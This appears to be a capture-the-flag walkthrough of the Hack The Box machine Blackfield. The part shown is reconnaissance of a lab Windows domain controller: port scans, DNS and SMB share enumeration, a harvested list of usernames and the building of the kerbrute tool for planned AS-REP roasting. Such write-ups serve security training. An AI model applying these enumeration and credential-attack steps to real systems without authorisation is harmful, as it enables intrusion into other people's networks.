---
layout: single
title: HTB - Blackfield
excerpt: HTB - Blackfield Walkthrough
date: 2022-02-12
classes: wide
header:
  teaser: /assets/images/htb-blackfield/htb-blackfield.png
categories:
  - walkthrough
tags:
  - GetNPUsers
  - ASRepRoast
  - ForceChangePassword
  - rpc-password-reset
  - bloodhound
  - pypykatz
  - evil-winrm
  - diskshadow
  - robocopy
  - secretsdump
---
![](/assets/images/htb-blackfield/htb-blackfield.png)

# Nmap

## TCP

```bash
sudo nmap -sC -sV -p 53,88,135,389,445,593,3268,5985 -oA scans/tcp-versions 10.129.156.28      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 22:49 EST
Nmap scan report for 10.129.156.28
Host is up (0.039s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-12 11:49:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m54s
| smb2-time: 
|   date: 2022-02-12T11:49:15
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.58 seconds
```

## UDP

```bash
sudo nmap -sU -sV --top-ports 20 -oA scans/top20udp 10.129.156.28                         
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 22:51 EST
Nmap scan report for 10.129.156.28
Host is up (0.039s latency).

PORT      STATE         SERVICE      VERSION
53/udp    open          domain       (generic dns response: SERVFAIL)
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.92%I=7%D=2/11%Time=62072EED%P=x86_64-pc-linux-gnu%r(NBTS
SF:tat,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAA
SF:AAAAAAA\0\0!\0\x01");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.93 seconds
```

# Enumeration

## DNS - TCP and UDP Port 53

### dig

```bash
dig -t any blackfield.local @10.129.156.28 

; <<>> DiG 9.18.0-2-Debian <<>> -t any blackfield.local @10.129.156.28
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63625
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;blackfield.local.              IN      ANY

;; ANSWER SECTION:
blackfield.local.       600     IN      A       10.129.156.28
blackfield.local.       3600    IN      NS      dc01.blackfield.local.
blackfield.local.       3600    IN      SOA     dc01.blackfield.local. hostmaster.blackfield.local. 175 900 600 86400 3600
blackfield.local.       600     IN      AAAA    dead:beef::dd03:fc3b:c0ee:7d9a

;; ADDITIONAL SECTION:
dc01.blackfield.local.  1200    IN      A       10.129.156.28
dc01.blackfield.local.  1200    IN      AAAA    dead:beef::dd03:fc3b:c0ee:7d9a

;; Query time: 40 msec
;; SERVER: 10.129.156.28#53(10.129.156.28) (TCP)
;; WHEN: Fri Feb 11 22:54:42 EST 2022
;; MSG SIZE  rcvd: 199
```

### dnsrecon

```bash
dnsrecon -n 10.129.156.28 -d blackfield.local -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[*] std: Performing General Enumeration against: blackfield.local...
[-] DNSSEC is not configured for blackfield.local
[*]      SOA dc01.blackfield.local 10.129.156.28
[*]      SOA dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a
[*]      NS dc01.blackfield.local 10.129.156.28
[*]      NS dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a
[*]      A blackfield.local 10.129.156.28
[*]      AAAA blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a
[*] Enumerating SRV Records
[+]      SRV _kerberos._tcp.blackfield.local dc01.blackfield.local 10.129.156.28 88
[+]      SRV _kerberos._tcp.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 88
[+]      SRV _kerberos._udp.blackfield.local dc01.blackfield.local 10.129.156.28 88
[+]      SRV _kerberos._udp.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 88
[+]      SRV _ldap._tcp.blackfield.local dc01.blackfield.local 10.129.156.28 389
[+]      SRV _ldap._tcp.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 389
[+]      SRV _gc._tcp.blackfield.local dc01.blackfield.local 10.129.156.28 3268
[+]      SRV _gc._tcp.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 3268
[+]      SRV _ldap._tcp.ForestDNSZones.blackfield.local dc01.blackfield.local 10.129.156.28 389
[+]      SRV _ldap._tcp.ForestDNSZones.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 389
[+]      SRV _ldap._tcp.dc._msdcs.blackfield.local dc01.blackfield.local 10.129.156.28 389
[+]      SRV _ldap._tcp.dc._msdcs.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 389
[+]      SRV _ldap._tcp.pdc._msdcs.blackfield.local dc01.blackfield.local 10.129.156.28 389
[+]      SRV _ldap._tcp.pdc._msdcs.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 389
[+]      SRV _ldap._tcp.gc._msdcs.blackfield.local dc01.blackfield.local 10.129.156.28 3268
[+]      SRV _ldap._tcp.gc._msdcs.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 3268
[+]      SRV _kerberos._tcp.dc._msdcs.blackfield.local dc01.blackfield.local 10.129.156.28 88
[+]      SRV _kerberos._tcp.dc._msdcs.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 88
[+]      SRV _kpasswd._tcp.blackfield.local dc01.blackfield.local 10.129.156.28 464
[+]      SRV _kpasswd._tcp.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 464
[+]      SRV _kpasswd._udp.blackfield.local dc01.blackfield.local 10.129.156.28 464
[+]      SRV _kpasswd._udp.blackfield.local dc01.blackfield.local dead:beef::dd03:fc3b:c0ee:7d9a 464
[+] 22 Records Found
➜  Blackfield
```

## SMB - TCP Port 445

### smbmap

```bash
smbmap -H 10.129.156.28 -u squid                         
[+] Guest session       IP: 10.129.156.28:445   Name: 10.129.156.28                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

### smbclient

```bash
smbclient -L 10.129.156.28 -U squid                    
Enter WORKGROUP\squid's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.156.28 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

Connecting to the `profiles$` share shows what could be usernames which can be used to leverage other attacks such as ASPRoast or Kerberoast if I can get some valid credentials

```bash
➜  Blackfield smbclient \\\\10.129.156.28\\profiles\$ -U squid
Enter WORKGROUP\squid's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
  ASischo                             D        0  Wed Jun  3 12:47:11 2020
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
  ATakach                             D        0  Wed Jun  3 12:47:11 2020
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                5102079 blocks of size 4096. 1687183 blocks available
```

# Kerbrute - ASPRoast

## Installing and compilling

```bash
➜  scripts git clone https://github.com/ropnop/kerbrute                                                                                                                                                                                                     
Cloning into 'kerbrute'...                                                                                                                                                                                                                                  
remote: Enumerating objects: 845, done.                                                                                                                                                                                                                     
remote: Counting objects: 100% (47/47), done.                                                                                                                                                                                                               
remote: Compressing objects: 100% (36/36), done.                                                                                                                                                                                                            
remote: Total 845 (delta 18), reused 28 (delta 10), pack-reused 798                                                                                                                                                                                         
Receiving objects: 100% (845/845), 419.70 KiB | 2.59 MiB/s, done.                                                                                                                                                                                           
Resolving deltas: 100% (371/371), done.                                                                                                                                                                                                                     
➜  scripts cd kerbrute                                                                                                                                                                                                                                      
➜  kerbrute git:(master) go build -ldflags "-s -w"                                                                                                                                                                                                          
➜  kerbrute git:(master) ✗ du -h kerbrute                                                                                                                                                                                                                   
4.9M    kerbrute                                                                                                                                                                                                                                            
➜  kerbrute git:(master) ✗ upx kerbrute                                                                                                                                                                                                                     
                       Ultimate Packer for eXecutables                                                                                                                                                                                                      
                          Copyright (C) 1996 - 2020                                                                                                                                                                                                         
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020                                                                                                                                                                               
                                                                                                                                                                                                                                                            
        File size         Ratio      Format      Name                                                                                                                                                                                                       
   --------------------   ------   -----------   -----------                                                                                                                                                                                                
   5136384 ->   1906660   37.12%   linux/amd64   kerbrute                                                                                                                                                                                                   
                                                                                                                                                                                                                                                            
Packed 1 file.                                                                                                                                                                                                                                              
